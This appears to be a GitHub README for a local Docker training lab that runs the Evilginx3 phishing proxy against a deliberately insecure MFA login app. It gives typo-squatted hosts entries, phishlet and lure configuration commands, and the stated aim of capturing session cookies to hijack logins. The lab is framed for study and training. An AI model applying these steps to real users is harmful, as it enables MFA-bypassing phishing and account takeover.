# Evilginx LAB on Docker
![back](evil-dock.jpg)

## Disclaimer
As you can imagine, this lab was created solely and exclusively for the purposes outlined in the<b>Why</b> section, and absolutely not for any malicious activity. Of course, I disclaim any responsibility for the improper use of the material contained in this repository.
The containers must absolutely not be exposed to a public network.

Please note that the comments inside files are in italian.

## Why?
I created a local lab to test Evilginx without the need to purchase a domain or presumably a VPS. It is useful for the following use cases:
1. Study and practice
2. Phishlet development and testing
3. Demonstrations and training activities

## Lab architecture
The lab consists of two Linux Docker containers. One hosts a simple PHP application that implements an MFA login process. The application is completely insecure, so it is strongly recommended not to expose it to the Internet and not to use the code in real-world applications. The second container hosts the Evilginx3 server.
You can find the static parameters to access the web application in <b>/app/login-config.php</b>

## Objective
Our goal is to intercept the authentication tokens (cookies) needed to hijack the user's session. It's very straightforward.

## Build & run the containers
Clone this repo and enter the directory, then execute:
	
	sudo docker-compose up --build -d --force-recreate --remove-orphans
	Building apache-php
	[+] Building 1.1s (11/11) FINISHED
	...
	Building evilginx2
	[+] Building 1.1s (10/10) FINISHED   
	...
	Creating targetsite.local ... done
	Creating targetsile.local ... done

	
Verify the containers:

	sudo docker ps
	CONTAINER ID   IMAGE                          COMMAND                  CREATED          STATUS          PORTS               NAMES
	636fa17740bf   evilginx_lab-main_apache-php   "apachectl -D FOREGR…"   41 minutes ago   Up 41 minutes   80/tcp, 443/tcp     targetsite.local
	2c595290c650   evilginx_lab-main_evilginx2    "/bin/bash -l"           41 minutes ago   Up 41 minutes   443/tcp, 8080/tcp   targetsile.local


## Mimic DNS
Modify hosts file in your host machine. Add the following lines:

	172.18.0.20 	targetsite.local login.targetsite.local
	172.18.0.10	targetsile.local login.targetsile.local
	
Visit the Legitimate site at: https://login.targetsite.local, with a bit of typo-squatting, the evil site will be https://login.targetsile.local


## Start evilnginx
Enter Evilginix container shell

	sudo docker exec -it /targetsile.local /bin/bash
Then start Evilginix in developer mode, in this mode, instead of trying to obtain LetsEncrypt SSL/TLS certificates, it will automatically generate self-signed certificates.
```bash  

root@e279e8098a4d:/evilginx2# ./evilginx2 -debug -developer

                                         
                                             ___________      __ __           __               
                                             \_   _____/__  _|__|  |    ____ |__| ____ ___  ___
                                              |    __)_\  \/ /  |  |   / __ \|  |/    \\  \/  /
                                              |        \\   /|  |  |__/ /_/  >  |   |  \>    < 
                                             /_______  / \_/ |__|____/\___  /|__|___|  /__/\_ \
                                                     \/              /_____/         \/      \/
                                         
                                                        - --  Community Edition  -- -
                                         
                                               by Kuba Gretzky (@mrgretzky)     version 3.3.0
                                         

[15:32:34] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)
[15:32:34] [inf] debug output enabled
[15:32:34] [inf] loading phishlets from: /evilginx2/phishlets
[15:32:34] [inf] loading configuration from: /root/.evilginx
[15:32:34] [inf] blacklist mode set to: unauth
[15:32:34] [inf] unauthorized request redirection URL set to: https://www.youtube.com/watch?v=dQw4w9WgXcQ
[15:32:34] [inf] https port set to: 443
[15:32:34] [inf] dns port set to: 53
[15:32:34] [inf] autocert is now enabled
[15:32:34] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
[15:32:34] [war] server domain not set! type: config domain <domain>
[15:32:34] [war] server external ip not set! type: config ipv4 external <external_ipv4_address>

+-------------------+-----------+-------------+-----------+-------------+
|     phishlet      |  status   | visibility  | hostname  | unauth_url  |
+-------------------+-----------+-------------+-----------+-------------+
| example           | disabled  | visible     |           |             |
| targetsite-local  | disabled  | visible     |           |             |
+-------------------+-----------+-------------+-----------+-------------+

:  

```
Note that I used the debug option too, since, I don't know why at the moment, the phishlet refues to capture the otp credential. Using the debug options permit to get the whole requests.
                                        
## Config Evilngnix container
```bash  
: config domain targetsile.local
: config ipv4 172.18.0.10
: phishlets hostname targetsite-local targetsile.local

: phishlets get-hosts targetsite-local 
	172.18.0.10 login.targetsile.local
	172.18.0.10 targetsile.local
	
: phishlets enable  targetsite-local 
: lures create targetsite-local 


+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+
| id  |     phishlet      | hostname  |   path     | redirector  | redirect_url  | paused  |  og   |                                                                                                                                        
+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+                                                                                                                                        
| 0   | targetsite-local  |           | /nBfYHrTO  |             |               |         | ----  |                                                                                                                                        
+-----+-------------------+-----------+------------+-------------+---------------+---------+-------+                                                                                

: lures get-url 0

	https://login.targetsile.local/nBfYHrTO
```
	
## Demo video
- I use Firefox to surf the lure's site
- I use Chromium to visit the legitimate site

<video width="320" height="240" controls>
  <source src="demo.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>


Enjoy :)

## Useful Docker commands

### Stop and remove all the containers

	 sudo docker stop $(docker ps -q) & sudo docker rm $(docker ps -a -q) & sudo docker image prune -a & sudo docker-compose down
	
### Access a shell's container

	sudo docker exec -it <container name> /bin/bash

### Check mounted volumes

	sudo docker inspect <container name> | grep Mounts -A 10
	

## Inspect logs

	sudo docker logs <container name>
	
### Show containers IP

	sudo docker ps -q | xargs -n 1 docker inspect -f '{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'
	
	/targetsite.local - 172.18.0.20
	/targetsile.local - 172.18.0.10

